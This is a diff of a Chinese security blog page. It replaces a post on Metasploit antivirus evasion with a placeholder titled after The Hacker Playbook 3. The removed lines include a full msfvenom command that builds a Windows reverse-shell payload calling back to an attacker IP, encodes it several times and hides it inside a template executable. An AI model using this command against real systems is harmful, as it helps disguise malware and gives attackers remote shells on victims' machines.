@@ -10,8 +10,7 @@
 
     <!--Description-->
     
-        <meta name="description" content="Metasploit免杀技术
-在进行渗透测试时，最尴尬的事莫过于被杀毒软件给检测出来这也是一个很容易被忽视的细节。如果事先没有做好计划进行免杀处理，很可能会惊动目标。大多数杀毒软件使用特征码来识别恶意代码。">
+        <meta name="description" content="aaaa">
     
 
     <!--Author-->
@@ -21,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Metasploit免杀技术"/>
+        <meta property="og:title" content="THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络"/>
     
 
     <!--Open Graph Description-->
@@ -43,7 +42,7 @@
 
     <!-- Title -->
     
-    <title>Metasploit免杀技术 - langke Blog</title>
+    <title>THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络 - langke Blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -147,13 +146,13 @@
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2018/10/24/Metasploit免杀技术/">
-                Metasploit免杀技术
+            <a href="/2019/04/18/THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络/">
+                THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2018-10-24</span>
+                <span class="date">2019-04-18</span>
             
             
             
@@ -166,33 +165,7 @@
         
 
         <!-- Post Content -->
-        <h1 id="Metasploit免杀技术"><a href="#Metasploit免杀技术" class="headerlink" title="Metasploit免杀技术"></a>Metasploit免杀技术</h1><blockquote>
-<p>在进行渗透测试时，最尴尬的事莫过于被杀毒软件给检测出来<br>这也是一个很容易被忽视的细节。<br>如果事先没有做好计划进行免杀处理，很可能会惊动目标。<br>大多数杀毒软件使用特征码来识别恶意代码。</p>
-</blockquote>
-<a id="more"></a>
-<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Metasploit/peitu_.png" alt=""></p>
-<blockquote>
-<p>我们的重点不是记住一些特定的命令，而是要掌握免杀处理方法的概念。<br>我们要弄清楚哪些操作可能会触发杀毒软件报警，<br>最重要的是多常识和实验</p>
-</blockquote>
-<h2 id="编码器"><a href="#编码器" class="headerlink" title="编码器"></a>编码器</h2><blockquote>
-<p>避免被查杀的最佳方法之一是使用MSF编码器对攻击载荷文件编码</p>
-</blockquote>
-<h3 id="常用命令简介"><a href="#常用命令简介" class="headerlink" title="常用命令简介"></a>常用命令简介</h3><ul>
-<li><code>-e</code>指定编码方式</li>
-<li><code>-i</code>指定编码次数</li>
-<li><code>-f</code>指定输出格式</li>
-<li><code>-a</code>指定使用的结构</li>
-<li><code>--platform</code>指定攻击负载的平台</li>
-<li><code>-p</code>指定payload</li>
-<li><code>-x</code>指定一个自定义可执行的文件作为一个模板</li>
-</ul>
-<blockquote>
-<p><strong>示例</strong><br>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.130<br> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f raw | msfvenom<br>-a x86 –platform windows -e x86/alpha_upper -i 2 -f raw<br>| msfvenom -a x86 –platform windows -e x86/shikata_ga_nai<br>-i 5 -f exe -x HipsMain.exe &gt; shellk.exe</p>
-</blockquote>
-<blockquote>
-<p><strong>命令讲解</strong><br><code>-p</code>使用payload<code>windows/shell_reverse_tcp</code><br><code>LHOST=192.168.11.130</code>反弹shell地址（攻击者ip）<br><code>LPORT=4444</code>反弹shell端口（攻击者主机端口）<br><code>-e</code>使用编码方式<code>x86/shikata_ga_nai</code><br><code>-i</code>编码次数<code>5</code>次<br><code>-f</code>指定输出文件格式<code>raw</code><br><code>|</code>前面的输出作为后面的输入,一般用在对payload进行多种编码。<br><code>-a</code>指定架构<code>x86</code><br><code>--platform</code>指定攻击负载的平台为<code>windows</code><br><code>-x</code>指定模板<code>HipsMain.exe</code><br><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/Metasploit/zidingyi.png" alt="moban"></p>
-</blockquote>
-<p>我在本地试了下，好像没什么用。</p>
+        <p>aaaa</p>
 
     </div>
 
@@ -201,7 +174,7 @@
     
         <div class="post-tags">
             <i class="fa fa-tags" aria-hidden="true"></i>
-            <a href="/tags/msf专题/">#msf专题</a>
+            <a href="/tags/THE-HACKER-PLAYBOOK-3/">#THE-HACKER-PLAYBOOK-3</a>
         </div>
     
 
